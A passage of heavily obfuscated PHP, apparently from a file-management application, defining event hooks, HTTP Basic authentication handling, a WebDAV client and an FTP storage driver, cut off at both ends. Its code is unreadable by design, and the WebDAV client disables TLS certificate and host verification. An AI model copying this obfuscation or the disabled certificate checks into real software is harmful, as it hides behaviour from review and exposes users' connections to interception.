\321\252\104\362\155\310\0\0"."".base64_decode(''), 10, -8))); goto AÓëÈ¦·´‡; Eä¬ŒÁ”: class Hook { private static $events = array(); public static function get($fÏä¹æ§±§ = false) { if (!$fÏä¹æ§±§) { return self::$events; } else { return self::$events[$fÏä¹æ§±§]; } } public static function apply($Fƒ»áÓéÑõ, $F¢èÂÓ¦®ë = array()) { $c¶Ø´‡ «ö = ActionApply($Fƒ»áÓéÑõ, $F¢èÂÓ¦®ë); if (is_string($Fƒ»áÓéÑõ)) { Hook::trigger($Fƒ»áÓéÑõ); } return $c¶Ø´‡ «ö; } public static function bind($dôÇ–§½‹Ş, $aÍÄ»Ò¤, $Fôõ—ó›ÖÊ = false) { $bóœë¦¢Ğ™ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!isset(self::$events[$dôÇ–§½‹Ş])) { self::$events[$dôÇ–§½‹Ş] = array(); } self::$events[$dôÇ–§½‹Ş][] = array($bóœë¦¢Ğ™[1758] => $aÍÄ»Ò¤, $bóœë¦¢Ğ™[1759] => $Fôõ—ó›ÖÊ, $bóœë¦¢Ğ™[1760] => 0); } public static function once($bÇ¥¯†ÓÔ•, $B¤öÃÖÖ¼›) { self::bind($bÇ¥¯†ÓÔ•, $B¤öÃÖÖ¼›, !0); } public static function unbind($F¥ÕŠ†ëÈÂ, $Eô­ÉÌ¾êÄ = false) { if (!$Eô­ÉÌ¾êÄ) { self::$events[$F¥ÕŠ†ëÈÂ] = array(); return; } $EšÛÊéŒ = self::$events[$F¥ÕŠ†ëÈÂ]; self::$events[$F¥ÕŠ†ëÈÂ] = array(); if (!is_array($EšÛÊéŒ)) { return; } for ($c©‘¶¢Â•” = 0; $c©‘¶¢Â•” < count($EšÛÊéŒ); $c©‘¶¢Â•”++) { if ($EšÛÊéŒ[$c©‘¶¢Â•”][$_SERVER[çŞáÓæÚô‚Ô‡][1758]] == $Eô­ÉÌ¾êÄ) { continue; } self::$events[$F¥ÕŠ†ëÈÂ][] = $EšÛÊéŒ[$c©‘¶¢Â•”]; } } public static function filter($EÛÑëØ›ùƒ, $DÅƒòÆğøÑ) { goto E½±†¼óÖˆ; E½±†¼óÖˆ: $d¾‰é‚ÛŠ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÔ‹¬Ş¹»Ä = self::$events; if (!isset($eÔ‹¬Ş¹»Ä[$EÛÑëØ›ùƒ])) { return $DÅƒòÆğøÑ; } goto dëãï‚‘öà; Cï¸²İÈ·¥: for ($eß«õ¨°µµ = 0; $eß«õ¨°µµ < count($cƒ¦­×ÉÊ); $eß«õ¨°µµ++) { $fîŸ¿¡¡¾ï = $cƒ¦­×ÉÊ[$eß«õ¨°µµ]; if ($fîŸ¿¡¡¾ï[$d¾‰é‚ÛŠ[1759]] && $fîŸ¿¡¡¾ï[$d¾‰é‚ÛŠ[1760]] > 1) { continue; } self::$events[$EÛÑëØ›ùƒ][$eß«õ¨°µµ][$d¾‰é‚ÛŠ[1760]] = $fîŸ¿¡¡¾ï[$d¾‰é‚ÛŠ[1760]] + 1; $BÁ¹”ŠÖíÀ = self::apply($fîŸ¿¡¡¾ï[$d¾‰é‚ÛŠ[1758]], array($aÈïÉãÓ¤)); if (gettype($BÁ¹”ŠÖíÀ) == gettype($aÈïÉãÓ¤)) { $aÈïÉãÓ¤ = $BÁ¹”ŠÖíÀ; } } return $aÈïÉãÓ¤; goto e¾¾ö»¨˜‹; dëãï‚‘öà: $cƒ¦­×ÉÊ = $eÔ‹¬Ş¹»Ä[$EÛÑëØ›ùƒ]; $aÈïÉãÓ¤ = $DÅƒòÆğøÑ; if (!is_array($cƒ¦­×ÉÊ) || count($cƒ¦­×ÉÊ) == 0) { return $aÈïÉãÓ¤; } goto Cï¸²İÈ·¥; e¾¾ö»¨˜‹: } public static function trigger($FœÜ­ÔÏ–¶) { goto cÎ®ùÖ×©ë; cÎ®ùÖ×©ë: $bçÜÅ¥¬Ä” =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bí Õ‡‡İÚ = self::$events; $bÂ÷©’Ã¦î = !1; goto d„™‡–Öì; BçöŒêòÉ: $cÖò»é‡ = func_get_args(); array_shift($cÖò»é‡); for ($A»¾£¬¿ = 0; $A»¾£¬¿ < count($d˜í¥¸î˜õ); $A»¾£¬¿++) { $cĞë—£Î§ = $d˜í¥¸î˜õ[$A»¾£¬¿]; if ($cĞë—£Î§[$bçÜÅ¥¬Ä”[1759]] && $cĞë—£Î§[$bçÜÅ¥¬Ä”[1760]] > 1) { continue; } if (defined($bçÜÅ¥¬Ä”[1761]) && GLOBAL_LOG_HOOK) { write_log($FœÜ­ÔÏ–¶ . $bçÜÅ¥¬Ä”[1762] . $cĞë—£Î§[$bçÜÅ¥¬Ä”[1758]], $bçÜÅ¥¬Ä”[1763]); } self::$events[$FœÜ­ÔÏ–¶][$A»¾£¬¿][$bçÜÅ¥¬Ä”[1760]] = $cĞë—£Î§[$bçÜÅ¥¬Ä”[1760]] + 1; $BÜ¢Ê£ŠÂô = self::apply($cĞë—£Î§[$bçÜÅ¥¬Ä”[1758]], $cÖò»é‡); if (defined($bçÜÅ¥¬Ä”[1761]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $bçÜÅ¥¬Ä”[1763]); if ($cĞë—£Î§[$bçÜÅ¥¬Ä”[1760]] == 200) { $aŞÄ¼Ÿ°ƒ = is_array($cĞë—£Î§[$bçÜÅ¥¬Ä”[1758]]) ? json_encode_force($cĞë—£Î§[$bçÜÅ¥¬Ä”[1758]]) : $cĞë—£Î§[$bçÜÅ¥¬Ä”[1758]]; write_log($bçÜÅ¥¬Ä”[1764] . $FœÜ­ÔÏ–¶ . $bçÜÅ¥¬Ä”[1765] . $aŞÄ¼Ÿ°ƒ, $bçÜÅ¥¬Ä”[1766]); } } $bÂ÷©’Ã¦î = is_null($BÜ¢Ê£ŠÂô) ? $bÂ÷©’Ã¦î : $BÜ¢Ê£ŠÂô; } goto CÑÕ ‡ã; CÑÕ ‡ã: return $bÂ÷©’Ã¦î; goto FÓèèÜå†; d„™‡–Öì: if (!isset($bí Õ‡‡İÚ[$FœÜ­ÔÏ–¶])) { return $bÂ÷©’Ã¦î; } $d˜í¥¸î˜õ = $bí Õ‡‡İÚ[$FœÜ­ÔÏ–¶]; if (!is_array($d˜í¥¸î˜õ) || count($d˜í¥¸î˜õ) == 0) { return $bÂ÷©’Ã¦î; } goto BçöŒêòÉ; FÓèèÜå†: } } class HttpAuth { public static function get() { $EøÖ›Ùô¢ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D©‹‹ÚŒ†Ä = $EøÖ›Ùô¢[43]; $BÌª¹ÒÂ·µ = $EøÖ›Ùô¢[43]; if (isset($_SERVER[$EøÖ›Ùô¢[1767]])) { $D©‹‹ÚŒ†Ä = $_SERVER[$EøÖ›Ùô¢[1767]]; $BÌª¹ÒÂ·µ = $_SERVER[$EøÖ›Ùô¢[1768]]; } elseif (isset($_SERVER[$EøÖ›Ùô¢[1769]])) { $aø¦ºƒ®±Ş = $_SERVER[$EøÖ›Ùô¢[1769]]; if (strpos(strtolower($aø¦ºƒ®±Ş), $EøÖ›Ùô¢[1770]) === 0) { $BÉÑğ®¶œÄ = explode($EøÖ›Ùô¢[4], base64_decode(substr($aø¦ºƒ®±Ş, 6))); $D©‹‹ÚŒ†Ä = isset($BÉÑğ®¶œÄ[0]) ? $BÉÑğ®¶œÄ[0] : $EøÖ›Ùô¢[43]; $BÌª¹ÒÂ·µ = isset($BÉÑğ®¶œÄ[1]) ? $BÉÑğ®¶œÄ[1] : 0; } } return array($EøÖ›Ùô¢[546] => $D©‹‹ÚŒ†Ä, $EøÖ›Ùô¢[903] => $BÌª¹ÒÂ·µ); } public static function error() { goto Eƒ¶çß‚–; eËŒÛğ‰æ»: die; goto aëÛ…Œ£Œ®; E¹¤Üã²„ì: header($eËƒÓ«šÂˆ[1773]); header($eËƒÓ«šÂˆ[1774]); header($eËƒÓ«šÂˆ[1270]); goto eËŒÛğ‰æ»; Eƒ¶çß‚–: $eËƒÓ«šÂˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; header($eËƒÓ«šÂˆ[1771]); header($eËƒÓ«šÂˆ[1772]); goto E¹¤Üã²„ì; aëÛ…Œ£Œ®: } public static function make($A±”¸Ô‘ºá, $b«ª–°öæÖ) { $DÔµÏš•¾¢ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return $DÔµÏš•¾¢[1775] + base64_encode($A±”¸Ô‘ºá . $DÔµÏš•¾¢[4] . $b«ª–°öæÖ); } } class HttpDavClient { public function __construct($bŒè»¶ä­î, $A¶Š Æï»Û, $Dš¾„öêÎ°) { $this->header = array(); $this->userName = $A¶Š Æï»Û; $this->userPassowrd = $Dš¾„öêÎ°; } protected function makePath($eÑø²‚í¦Š) { return $eÑø²‚í¦Š; } protected function setHeader($e Ì–Æäöî, $bõºˆğÇÛá = false) { if ($bõºˆğÇÛá === !1) { $this->header[] = $e Ì–Æäöî; } else { $this->header[] = $e Ì–Æäöî . $_SERVER[çŞáÓæÚô‚Ô‡][886] . $bõºˆğÇÛá; } } public function move($b‘„»Ï†Ç , $dëÀ¨‡©Â, $Fí©•º„²ê = '') { $f±ßÁ–ŠÒ© =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->setHeader($f±ßÁ–ŠÒ©[1776], $this->makePath($dëÀ¨‡©Â)); $this->setHeader($f±ßÁ–ŠÒ©[1777], $f±ßÁ–ŠÒ©[1778]); if ($Fí©•º„²ê) { $this->setHeader($f±ßÁ–ŠÒ©[1779], $f±ßÁ–ŠÒ©[931] . $Fí©•º„²ê . $f±ßÁ–ŠÒ©[934]); } return $this->send($f±ßÁ–ŠÒ©[1780], $b‘„»Ï†Ç ); } public function copy($C†ÑÎ‹õÉ, $a‘‘­àš¿Á) { $fçÆªÒ»ò =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->setHeader($fçÆªÒ»ò[1776], $this->makePath($a‘‘­àš¿Á)); $this->setHeader($fçÆªÒ»ò[1777], $fçÆªÒ»ò[1778]); return $this->send($fçÆªÒ»ò[1781], $C†ÑÎ‹õÉ); } public function mkcol($e«Î‚ãÃÎ¸) { $e½ºÕŸ‚ô =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->setHeader($e½ºÕŸ‚ô[1777], $e½ºÕŸ‚ô[1778]); return $this->send($e½ºÕŸ‚ô[1782], $e«Î‚ãÃÎ¸); } public function delete($aÃ²ˆÕèÍ³, $cìÖ»æª = '') { $BîÌ•Óò =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($cìÖ»æª) { $this->setHeader($BîÌ•Óò[1779], $BîÌ•Óò[931] . $cìÖ»æª . $BîÌ•Óò[934]); } return $this->send($BîÌ•Óò[1258], $aÃ²ˆÕèÍ³); } public function propfind($d§Âª½—²) { $AÄ®±½Â¶ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->setHeader($AÄ®±½Â¶[1783], $AÄ®±½Â¶[93]); $this->setHeader($AÄ®±½Â¶[1784], $AÄ®±½Â¶[1785]); $D¯†¨ÄÑÃÒ = $AÄ®±½Â¶[1786]; return $this->send($AÄ®±½Â¶[1787], $d§Âª½—², $D¯†¨ÄÑÃÒ); } public function options($D˜‹¾¸Ú­¼) { return $this->send($_SERVER[çŞáÓæÚô‚Ô‡][1788], $D˜‹¾¸Ú­¼); } public function get($a„±½ŞÚË) { return $this->send($_SERVER[çŞáÓæÚô‚Ô‡][226], $a„±½ŞÚË); } public function put($aàåÖò£…, $A”Øº‘©ùö, $Eá‘Œ¯ÍØ = '') { $CŸÑ½Ø®Ş® =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($Eá‘Œ¯ÍØ) { $this->setHeader($CŸÑ½Ø®Ş®[1779], $CŸÑ½Ø®Ş®[931] . $Eá‘Œ¯ÍØ . $CŸÑ½Ø®Ş®[934]); } return $this->send($CŸÑ½Ø®Ş®[224], $aàåÖò£…, $A”Øº‘©ùö); } protected function send($BĞÛÌÄååñ, $a½ÒÔé‚²È, $aÃŒå¿­š— = false, $A‘¼…ÊÂƒÛ = false) { goto C„ÜñØ’ô¹; cœ”‚‹Â›: $DòÕ‡Ûµ¾ = curl_init($a½ÒÔé‚²È); curl_setopt($DòÕ‡Ûµ¾, CURLOPT_CUSTOMREQUEST, $BĞÛÌÄååñ); curl_setopt($DòÕ‡Ûµ¾, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto b¼šŒƒÕŸá; C„ÜñØ’ô¹: $b‘×œ‹¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÊİŒª²æÅ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($b‘×œ‹¥[1789], $b‘×œ‹¥[60]); goto Cµƒ–ÛÎĞ; DÎ×Ëêµ¿: $this->header = array(); return $có„†©›ï¢; goto EÔ³¯Öö¹Ò; b¼šŒƒÕŸá: curl_setopt($DòÕ‡Ûµ¾, CURLOPT_HTTPHEADER, $this->header); curl_setopt($DòÕ‡Ûµ¾, CURLOPT_RETURNTRANSFER, !0); curl_setopt($DòÕ‡Ûµ¾, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto F¾Š¤“¾“Õ; Cµƒ–ÛÎĞ: $this->setHeader($EÊİŒª²æÅ); if ($aÃŒå¿­š—) { $aÃŒå¿­š— = $b‘×œ‹¥[1790] . $aÃŒå¿­š—; } if (!request_url_safe($a½ÒÔé‚²È)) { return !1; } goto cœ”‚‹Â›; F¾Š¤“¾“Õ: curl_setopt($DòÕ‡Ûµ¾, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($DòÕ‡Ûµ¾, CURLOPT_SSL_VERIFYHOST, !1); $có„†©›ï¢ = curl_exec($DòÕ‡Ûµ¾); goto DÎ×Ëêµ¿; EÔ³¯Öö¹Ò: } } goto B‰²±©ßÛ…; Eë®†â’¦µ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($b·è™†­£İ) { parent::__construct(); if (count($b·è™†­£İ) > 0) { $this->_init($b·è™†­£İ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($B£ˆ¼…è½‹) { $dé³À«×­œ =& $_SERVER[çŞáÓæÚô‚Ô‡]; global $config; $this->appCharset = $config[$dé³À«×­œ[1159]]; $this->systemCharset = $config[$dé³À«×­œ[1160]]; if (isset($B£ˆ¼…è½‹[$dé³À«×­œ[1161]]) && $B£ˆ¼…è½‹[$dé³À«×­œ[1161]]) { $this->systemCharset = $B£ˆ¼…è½‹[$dé³À«×­œ[1161]]; } } public function iconvApp($Aæ¦Ò×İâ„) { return $this->iconvTo($Aæ¦Ò×İâ„, $this->systemCharset, $this->appCharset); } public function iconvSystem($D„•”ŸÄ¦¡) { return $this->iconvTo($D„•”ŸÄ¦¡, $this->appCharset, $this->systemCharset); } public function getPathOuter($CòÎØ¤Ã¦) { goto bÅ‚†ºÑ‹; F»“Š–…»ø: $CòÎØ¤Ã¦ = KodIO::clear($CòÎØ¤Ã¦); $CòÎØ¤Ã¦ = substr($CòÎØ¤Ã¦, strlen($E©‚…µ¦)); if (empty($this->pathDriver)) { return $CòÎØ¤Ã¦; } goto dËóØÄ¡Üª; bÅ‚†ºÑ‹: $D½‡ŸÓô‚Ÿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E©‚…µ¦ = $this->iconvApp($this->pathBase); $CòÎØ¤Ã¦ = $this->iconvApp($CòÎØ¤Ã¦); goto fÈ¨±î™ñ; dËóØÄ¡Üª: return $this->pathDriver . $D½‡ŸÓô‚Ÿ[18] . ltrim($CòÎØ¤Ã¦, $D½‡ŸÓô‚Ÿ[18]); goto fÈğÍè¢ÈÜ; fÈ¨±î™ñ: if (substr($E©‚…µ¦, 0, 2) == $D½‡ŸÓô‚Ÿ[1162]) { $E©‚…µ¦ = BASIC_PATH . substr($E©‚…µ¦, 2); } if (substr($CòÎØ¤Ã¦, 0, 2) == $D½‡ŸÓô‚Ÿ[1162]) { $CòÎØ¤Ã¦ = BASIC_PATH . substr($CòÎØ¤Ã¦, 2); } $E©‚…µ¦ = KodIO::clear($E©‚…µ¦); goto F»“Š–…»ø; fÈğÍè¢ÈÜ: } private function _init($C±‰¯Í¿óé = array()) { $bÊ¨œˆÆìº =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!function_exists($bÊ¨œˆÆìº[1163])) { show_json(LNG($bÊ¨œˆÆìº[1164]), !1); } $this->config = $C±‰¯Í¿óé; $this->charsetReset($C±‰¯Í¿óé); foreach ($C±‰¯Í¿óé as $d©ïÊçŸˆÄ => $F•î™é¦Ìà) { if (isset($this->{$d©ïÊçŸˆÄ})) { $this->{$d©ïÊçŸˆÄ} = $F•î™é¦Ìà; } } return $this->_login($C±‰¯Í¿óé); } private function _login($DÁ‹ö´¦í¥) { goto c­Šé³ÉØ‡; Bƒé®í¨ù: $DÉ¶èØÕÅ = isset($dÔô‡×«ŞÂ[$Fí«¢ß…Ã¯[178]]) && $dÔô‡×«ŞÂ[$Fí«¢ß…Ã¯[178]] == $Fí«¢ß…Ã¯[1165] ? !0 : !1; $this->scheme = $DÉ¶èØÕÅ ? $Fí«¢ß…Ã¯[1166] : $Fí«¢ß…Ã¯[1167]; $this->port = isset($dÔô‡×«ŞÂ[$Fí«¢ß…Ã¯[180]]) ? $dÔô‡×«ŞÂ[$Fí«¢ß…Ã¯[180]] : 21; goto B¯—˜ˆŒß; eó“¶¢ëËä: $a—‡¾’¶æ[$f™•­´¾œ] = array($Fí«¢ß…Ã¯[1168] => $this->connect, $Fí«¢ß…Ã¯[179] => $this->host, $Fí«¢ß…Ã¯[178] => $this->scheme, $Fí«¢ß…Ã¯[180] => $this->port); return $C¡†é…Ä¸ç; goto AŸÈ–¾ó—Ø; c÷ğçİÀ‹: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $cÙÉÆÜä°ª = $this->pasv == $Fí«¢ß…Ã¯[93] ? !0 : !1; @ftp_pasv($this->connect, $cÙÉÆÜä°ª); goto eó“¶¢ëËä; B¯—˜ˆŒß: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $C¡†é…Ä¸ç = @ftp_login($this->connect, $this->username, $this->userpass); goto c÷ğçİÀ‹; c­Šé³ÉØ‡: $Fí«¢ß…Ã¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $a—‡¾’¶æ = array(); $f™•­´¾œ = md5(json_encode($DÁ‹ö´¦í¥)); goto b¿¡ñ†™ç†; b¿¡ñ†™ç†: if (isset($a—‡¾’¶æ[$f™•­´¾œ])) { foreach ($a—‡¾’¶æ[$f™•­´¾œ] as $cÂï£ïÛ‡Ô => $B­˜ïßĞ) { $this->{$cÂï£ïÛ‡Ô} = $B­˜ïßĞ; } return !0; } $dÔô‡×«ŞÂ = parse_url(trim($this->server, $Fí«¢ß…Ã¯[18])); $this->host = $dÔô‡×«ŞÂ[$Fí«¢ß…Ã¯[179]]; goto Bƒé®í¨ù; AŸÈ–¾ó—Ø: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($D”é»½è¤, $C¶Ò¤÷ó¯Œ = '', $A–¨½Ä² = REPEAT_RENAME) { if ($this->setContent($D”é»½è¤, $C¶Ò¤÷ó¯Œ)) { return $this->getPathOuter($D”é»½è¤); } return !1; } public function mkdir($aÏœ¼£–ƒÍ, $c©ÙÕ„Ş“® = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $aÏœ¼£–ƒÍ = $this->iconvSystem($aÏœ¼£–ƒÍ); if ($this->isFolder($aÏœ¼£–ƒÍ) || @ftp_mkdir($this->connect, $aÏœ¼£–ƒÍ)) { return $this->getPathOuter($aÏœ¼£–ƒÍ); } if (!$this->mkdir($this->pathFather($aÏœ¼£–ƒÍ))) { return !1; } if ($aÏœ¼£–ƒÍ = @ftp_mkdir($this->connect, $aÏœ¼£–ƒÍ)) { return $this->getPathOuter($aÏœ¼£–ƒÍ); } return !1; } public function copyFile($d„“áÇøÅ, $EôÕĞíÆçª) { goto B£óè‚§±½; DŸµèæÏõÖ: $a°¼‹½Õ” = $this->iconvApp($e³¦ÅáµÅÌ); $this->download($d„“áÇøÅ, $a°¼‹½Õ”); $eÛ‰ÛÏÃ×­ = $this->upload($EôÕĞíÆçª, $a°¼‹½Õ”); goto cåóçğÔ²È; B£óè‚§±½: if (!$this->_isconn()) { return !1; } $Cë–ÌÖÁÏ = $this->pathThis($this->iconvSystem($d„“áÇøÅ)); $e³¦ÅáµÅÌ = $this->tempFile($Cë–ÌÖÁÏ); goto DŸµèæÏõÖ; cåóçğÔ²È: $this->tempFileRemve($e³¦ÅáµÅÌ); return $eÛ‰ÛÏÃ×­; goto E‰Ó£§Ï“; E‰Ó£§Ï“: } public function moveFile($fÌ„À¼ªÛĞ, $f«®âßí½) { if (!$this->_isconn()) { return !1; } $fÌ„À¼ªÛĞ = $this->iconvSystem($fÌ„À¼ªÛĞ); $f«®âßí½ = $this->iconvSystem($f«®âßí½); $fİá±º„Š‡ = @ftp_rename($this->connect, $fÌ„À¼ªÛĞ, $f«®âßí½); return $fİá±º„Š‡ ? $this->getPathOuter($f«®âßí½) : !1; } public function delFile($Bï…‚æ‰èç) { if (!$this->_isconn()) { return !1; } $Bï…‚æ‰èç = $this->iconvSystem($Bï…‚æ‰èç); return @ftp_delete($this->connect, $Bï…‚æ‰èç); } public function delFolder($bËöù’˜©Ç) { if (!$this->_isconn()) { return !1; } $bËöù’˜©Ç = $this->iconvSystem($bËöù’˜©Ç); $bëß¦ÚÓ¨Õ = $this->ftpList($bËöù’˜©Ç); if (!$bëß¦ÚÓ¨Õ) { return @ftp_rmdir($this->connect, $bËöù’˜©Ç); } foreach ($bëß¦ÚÓ¨Õ as $aÉµ”ç˜®) { if ($this->isFolder($aÉµ”ç˜®)) { $aÉµ”ç˜® = $this->iconvApp($aÉµ”ç˜®); $this->delFolder($aÉµ”ç˜®); } else { @ftp_delete($this->connect, $aÉµ”ç˜®); } } return @ftp_rmdir($this->connect, $bËöù’˜©Ç); } public function rename($BÆ½Õ¡·æª, $e§ŞùÎÕ·†) { goto e¹µ«°óçÛ; E•èµ……‰: $D²›²Á†™ç = rtrim($E×êù£Í’‘, $A²š¾æ®°[18]) . $A²š¾æ®°[18] . $a¥±ê¹†ñ; $C‚ôÌ‘©ÂŒ = @ftp_rename($this->connect, $BÆ½Õ¡·æª, $D²›²Á†™ç); $D²›²Á†™ç = $this->iconvApp($D²›²Á†™ç); goto Dæ»öÚ†­; e¹µ«°óçÛ: $A²š¾æ®° =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->_isconn()) { return !1; } $a¥±ê¹†ñ = $this->fileNameAuto($this->pathFather($BÆ½Õ¡·æª), $e§ŞùÎÕ·†); goto FêŠØÉÑê»; FêŠØÉÑê»: $a¥±ê¹†ñ = $this->iconvSystem($a¥±ê¹†ñ); $BÆ½Õ¡·æª = $this->iconvSystem($BÆ½Õ¡·æª); $E×êù£Í’‘ = $this->pathFather($BÆ½Õ¡·æª); goto E•èµ……‰; Dæ»öÚ†­: return $C‚ôÌ‘©ÂŒ ? $this->getPathOuter($D²›²Á†™ç) : !1; goto aëâ‘³ùÊ¯; aëâ‘³ùÊ¯: } private function folderInfo($B›ØÍÜ¼, $AİÊ˜Ç²ï = false) { goto eœ§ğó‡ĞÈ; e‚±¸“ĞŒô: return $cÀ–‚“Š; goto A¦‘‘Çˆ¶à; eœ§ğó‡ĞÈ: $cŞ’°š‰‰Ù =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C„æ¯Šˆ« = $this->getPathOuter(rtrim($B›ØÍÜ¼, $cŞ’°š‰‰Ù[18])); $A©ŒÈ´ÂÅÃ = $this->pathThis($C„æ¯Šˆ«); goto bÇÂˆá£Á; bÇÂˆá£Á: $e¶é¬µ–…Ö = $this->iconvSystem($B›ØÍÜ¼); if ($AİÊ˜Ç²ï) { return array($cŞ’°š‰‰Ù[38] => $A©ŒÈ´ÂÅÃ, $cŞ’°š‰‰Ù[85] => $C„æ¯Šˆ«, $cŞ’°š‰‰Ù[39] => $cŞ’°š‰‰Ù[86]); } $cÀ–‚“Š = array($cŞ’°š‰‰Ù[38] => $A©ŒÈ´ÂÅÃ, $cŞ’°š‰‰Ù[85] => $C„æ¯Šˆ«, $cŞ’°š‰‰Ù[39] => $cŞ’°š‰‰Ù[86], $cŞ’°š‰‰Ù[197] => 0, $cŞ’°š‰‰Ù[117] => 0, $cŞ’°š‰‰Ù[1169] => !0, $cŞ’°š‰‰Ù[1170] => !0); goto e‚±¸“ĞŒô; A¦‘‘Çˆ¶à: } private function fileInfo($b‚Ÿğ” Ÿ, $c¡åœšîÏ© = false) { goto E·ñ¬Ú´Ëë; c¡¦†ŒìÌ: $cĞ•’ï‰×Œ = $this->iconvSystem($b‚Ÿğ” Ÿ); if ($c¡åœšîÏ©) { return array($d‹ƒ—Ù±ÑÕ[38] => $E´º£·â…¦, $d‹ƒ—Ù±ÑÕ[85] => $E±ØïáÑ³º, $d‹ƒ—Ù±ÑÕ[39] => $d‹ƒ—Ù±ÑÕ[177], $d‹ƒ—Ù±ÑÕ[170] => $this->ext($b‚Ÿğ” Ÿ), $d‹ƒ—Ù±ÑÕ[87] => $this->size($b‚Ÿğ” Ÿ)); } $e‹ÉÂ‘ÅÒ = array($d‹ƒ—Ù±ÑÕ[38] => $E´º£·â…¦, $d‹ƒ—Ù±ÑÕ[85] => $E±ØïáÑ³º, $d‹ƒ—Ù±ÑÕ[39] => $d‹ƒ—Ù±ÑÕ[177], $d‹ƒ—Ù±ÑÕ[197] => 0, $d‹ƒ—Ù±ÑÕ[117] => @ftp_mdtm($this->connect, $cĞ•’ï‰×Œ), $d‹ƒ—Ù±ÑÕ[170] => $this->ext($b‚Ÿğ” Ÿ), $d‹ƒ—Ù±ÑÕ[87] => $this->size($b‚Ÿğ” Ÿ), $d‹ƒ—Ù±ÑÕ[1169] => !0, $d‹ƒ—Ù±ÑÕ[1170] => !0); goto A³¢÷¬¢•; A³¢÷¬¢•: $e‹ÉÂ‘ÅÒ[$d‹ƒ—Ù±ÑÕ[117]] = $e‹ÉÂ‘ÅÒ[$d‹ƒ—Ù±ÑÕ[117]] > 0 ? $e‹ÉÂ‘ÅÒ[$d‹ƒ—Ù±ÑÕ[117]] : 0; return $e‹ÉÂ‘ÅÒ; goto D‰ì½¢Û; E·ñ¬Ú´Ëë: $d‹ƒ—Ù±ÑÕ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E±ØïáÑ³º = $this->getPathOuter(rtrim($b‚Ÿğ” Ÿ, $d‹ƒ—Ù±ÑÕ[18])); $E´º£·â…¦ = $this->pathThis($E±ØïáÑ³º); goto c¡¦†ŒìÌ; D‰ì½¢Û: } public function size($aè­àª–çŒ) { $BÈßçµ÷äÂ = $this->objectMeta($aè­àª–çŒ); return $BÈßçµ÷äÂ ? $BÈßçµ÷äÂ[$_SERVER[çŞáÓæÚô‚Ô‡][87]] : 0; } public function info($E‘ë˜šãê) { if ($this->isFile($E‘ë˜šãê)) { return $this->fileInfo($E‘ë˜šãê, 0); } else { if ($this->isFolder($E‘ë˜šãê)) { return $this->folderInfo($E‘ë˜šãê); } } return !1; } public function exist($B„±‘Ö×À) { return $this->objectMeta($B„±‘Ö×À) ? !0 : !1; } public function isFile($C²åÔ›¼Ÿ×) { $fŒåƒÕç„ß =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aÓ¢ÜĞîÉÙ = $this->objectMeta($C²åÔ›¼Ÿ×); return $aÓ¢ÜĞîÉÙ ? $aÓ¢ÜĞîÉÙ[$fŒåƒÕç„ß[39]] == $fŒåƒÕç„ß[177] : !1; } public function isFolder($A™ƒ¹Ë…¬) { $dã¤¿‰èõ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÂä¼î = $this->objectMeta($A™ƒ¹Ë…¬); return $DÂä¼î ? $DÂä¼î[$dã¤¿‰èõ[39]] == $dã¤¿‰èõ[86] : !1; } public function listPath($a¶‘½«ÕİÚ, $dŒ……‡Ğ° = false) { goto D²£»Ğæî; AÅùò ‘Âë: foreach ($fò…æÑ³Ğ as $a¶‘½«ÕİÚ) { if ($this->isFolder($a¶‘½«ÕİÚ)) { $b¼ĞŒ™¢àó[$DÙë—„Š¥Å[84]][] = $this->folderInfo($a¶‘½«ÕİÚ, $dŒ……‡Ğ°); } else { $b¼ĞŒ™¢àó[$DÙë—„Š¥Å[83]][] = $this->fileInfo($a¶‘½«ÕİÚ, $dŒ……‡Ğ°); } } return $b¼ĞŒ™¢àó; goto e¨Ú—Ğ³Â; D²£»Ğæî: $DÙë—„Š¥Å =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->_isconn()) { return !1; } $a¶‘½«ÕİÚ = $this->iconvSystem($a¶‘½«ÕİÚ); goto bõíÙ‰©‚”; bõíÙ‰©‚”: $fò…æÑ³Ğ = $this->ftpList($a¶‘½«ÕİÚ); $b¼ĞŒ™¢àó = array($DÙë—„Š¥Å[84] => array(), $DÙë—„Š¥Å[83] => array()); if (!$fò…æÑ³Ğ) { return $b¼ĞŒ™¢àó; } goto AÅùò ‘Âë; e¨Ú—Ğ³Â: } public function has($A–í©¶Ñ¦“, $Cš°âô²Ğï = false, $cĞÓãŠÓâ¤ = true) { goto aæö©’‰·×; C‹²Ë§Ò‡: foreach ($ağ“Üºù‡Ó as $A–í©¶Ñ¦“) { if ($cĞÓãŠÓâ¤) { if 